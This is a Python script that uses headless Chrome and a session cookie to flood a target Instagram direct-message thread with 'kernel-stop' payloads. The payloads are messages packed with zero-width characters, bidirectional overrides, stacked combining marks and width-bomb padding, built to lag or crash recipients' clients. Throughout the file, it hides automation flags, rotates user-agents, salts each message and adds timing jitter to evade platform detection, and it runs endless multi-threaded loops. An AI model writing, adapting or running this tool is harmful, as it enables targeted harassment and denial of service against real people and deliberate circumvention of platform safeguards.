# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (KERNEL-STOP STEALTH)
# 📅 STATUS: BYPASS-V4 | DENSITY x80 | DYNAMIC-JITTER

import os, time, random, sys, gc, threading
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS_PER_MACHINE = 2
MACHINE_ID = os.getenv("MACHINE_ID", "GLOBAL")

def get_kernel_stop_payload(target_name):
    u_id = random.randint(1000, 9999)
    # Unique salt for every payload to break server-side hash detection
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d"], k=5))
    header = f"⚡ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚡\n🆔 {u_id}{salt}\n"
    shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(350))
    z_tower = "̸" * 800
    width_bomb = "\u2800\u00A0" * 150

    lines = [header, shifter]
    for i in range(42):
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("0123456789", k=3))
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_{noise}{z_tower}")
    return "\n".join(lines)[:9995]

def get_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    
    # 🕵️ STEALTH ARGS: Hiding automation flags
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    
    # Rotating high-end Desktop User-Agents
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    ]
    chrome_options.add_argument(f"user-agent={random.choice(ua_list)}")
    
    driver = webdriver.Chrome(options=chrome_options)
    
    # 💉 CDP PATCH: Removing the 'webdriver' property from the browser context
    driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
        "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
    })
    return driver

def agent_blitz(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        strike_count = 0
        try:
            driver = get_driver()
            # Visit robots.txt first to set the domain context safely
            driver.get("https://www.instagram.com/robots.txt")
            time.sleep(2)
            
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(random.uniform(10, 15)) # Human-like page load wait

            while True:
                try:
                    # Search for textbox dynamically
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    # 💥 DYNAMIC BURST (Varies between 1 and 2 strikes to avoid pattern detection)
                    for _ in range(random.randint(1, 2)):
                        payload = get_kernel_stop_payload(target_name)
                        driver.execute_script("arguments[0].innerText = arguments[1];", box, payload)
                        box.send_keys(Keys.ENTER)
                        strike_count += 1
                        print(f"💀 [M{MACHINE_ID}-A{agent_id}] STRIKE {strike_count}", flush=True)
                        time.sleep(random.uniform(0.1, 0.4))

                    # ⏳ DYNAMIC JITTER: Variable rest to mimic human typing speed
                    time.sleep(random.uniform(1.5, 3.5))
                    
                    # Periodic scroll to show "Activity"
                    if strike_count % 5 == 0:
                        driver.execute_script("window.scrollBy(0, -200);")
                    
                    # Safety refresh to clear memory leaks & detection
                    if strike_count % 12 == 0:
                        driver.refresh()
                        time.sleep(random.uniform(8, 12))

                except Exception:
                    break # Reconnect on UI lag

        except Exception:
            if driver: driver.quit()
            time.sleep(15)
            continue

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    
    with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
        for i in range(THREADS_PER_MACHINE):
            executor.submit(agent_blitz, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
